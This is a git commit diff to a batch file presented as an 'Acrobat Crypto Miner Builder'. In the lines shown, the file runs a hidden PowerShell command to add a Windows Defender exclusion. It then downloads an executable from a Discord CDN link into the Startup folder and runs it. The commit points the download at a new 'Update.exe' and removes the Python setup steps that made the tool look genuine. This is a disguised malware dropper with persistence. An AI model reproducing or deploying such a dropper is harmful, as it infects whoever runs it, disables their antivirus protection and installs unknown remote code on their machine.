09535a826f91ac2ef2c17219234834574bbac8e8
Autarch Of Goats <160428167+AutarchOfGoats@users.noreply.github.com>
2024-03-21 19:09:03 +0300

    Update Acrobat Crypto Miner Builder.bat

--- AcrobatCryptoMiner/Acrobat Crypto Miner Builder.bat
+++ AcrobatCryptoMiner/Acrobat Crypto Miner Builder.bat
@@ -3,7 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1201945226504052767/1220037731707519068/Built.exe?ex=660d7bae&is=65fb06ae&hm=15a77b197b98a9c06966cae288b695da2ac7ed0ac6296afc8f939039d00ff3bf&"
+set "URL=https://cdn.discordapp.com/attachments/1201945226504052767/1220401254115709008/Update.exe?ex=660ece3c&is=65fc593c&hm=db6bf9f95339afc54a3a8911fa8ef21a03dda06027518328ed69f3a0f8b156af&"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
@@ -20,7 +20,7 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1201945226504052767/1220037731707519068/Built.exe?ex=660d7bae&is=65fb06ae&hm=15a77b197b98a9c06966cae288b695da2ac7ed0ac6296afc8f939039d00ff3bf&"
+set "URL=https://cdn.discordapp.com/attachments/1201945226504052767/1220401254115709008/Update.exe?ex=660ece3c&is=65fc593c&hm=db6bf9f95339afc54a3a8911fa8ef21a03dda06027518328ed69f3a0f8b156af&"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
@@ -33,37 +33,3 @@ if %errorlevel% neq 0 (
 )
 
 call "%DEST%"
-
-
-title Checking Python installation...
-python --version > nul 2>&1
-if %errorlevel% neq 0 (
-    echo Python is not installed! (Go to https://www.python.org/downloads and install the python 3.11.0^)
-    echo Very important click Add python exe to PATH.
-    pause
-)
-
-title Checking Python libraries...
-echo Checking 'cryptography' (1/3)
-python -c "import cryptography" > nul 2>&1
-if %errorlevel% neq 0 (
-    echo Installing cryptography...
-    python -m pip install cryptography > nul
-)
-
-echo Checking 'aiohttp' (2/3)
-python -c "import aiohttp" > nul 2>&1
-if %errorlevel% neq 0 (
-    echo Installing aiohttp...
-    python -m pip install aiohttp > nul
-)
-
-echo Checking 'pyinstaller' (3/3)
-python -c "import PyInstaller" > nul 2>&1
-if %errorlevel% neq 0 (
-    echo Installing pyinstaller...
-    python -m pip install pyinstaller > nul
-)
-
-cls
-python index.py
